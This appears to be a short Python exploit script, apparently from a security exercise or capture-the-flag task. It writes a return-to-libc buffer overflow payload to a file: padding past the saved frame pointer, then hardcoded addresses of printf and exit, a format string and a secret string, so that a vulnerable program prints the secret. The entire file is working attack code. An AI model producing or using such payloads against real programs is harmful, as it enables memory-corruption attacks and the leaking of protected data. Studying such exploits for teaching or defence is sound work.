#!/usr/bin/python

padding = 88 # difference between $ebp and &buf
padding_past_ebp = padding + 4
printf_addr = "\x60\x9c\xe3\xf7"
exit_addr = "\x60\x90\xe1\xf7"
fmt_addr = "\xbc\xd3\xff\xff"
secret_addr = "\x43\xd4\xff\xff"
# string contents written without little endian.
fmt_str = "%s\n"

with open('abc', 'wb') as f:
    f.write(" " * padding_past_ebp \
            + printf_addr \
            + exit_addr \
            + fmt_addr \
            + secret_addr \
            + fmt_str)
